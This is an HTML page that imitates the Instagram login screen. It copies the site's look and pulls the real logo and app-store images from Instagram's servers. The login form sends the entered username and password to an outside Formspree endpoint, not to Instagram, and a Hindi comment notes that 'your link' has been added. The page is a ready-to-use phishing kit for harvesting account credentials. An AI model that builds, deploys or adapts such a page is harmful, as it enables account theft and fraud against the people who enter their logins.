<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
        }

        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px 40px;
            width: 100%;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo-img {
            width: 175px;
            margin-bottom: 30px;
        }

        .input-field {
            position: relative;
            margin-bottom: 6px;
            width: 100%;
        }

        .input-field input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }

        .input-field input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 15px;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 15px 0;
        }

        .separator::before, .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator::before {
            margin-right: 18px;
        }

        .separator::after {
            margin-left: 18px;
        }

        .fb-login {
            color: #385185;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #262626;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 15px;
        }

        .app-stores img {
            height: 40px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="login-box">
            <!-- Instagram Logo -->
            <img class="logo-img" src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" alt="Instagram">

            <!-- Yahan aapki link add kar di gayi hai -->
            <form action="https://formspree.io/f/xqpanbao" method="POST">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>

            <div class="separator">OR</div>

            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="get-app">
            Get the app.
            <div class="app-stores">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/ye/r/ZjC1fub_IL2.png" alt="App Store">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yf/r/BFItvDbcECz.png" alt="Google Play">
            </div>
        </div>
    </div>

</body>
</html>
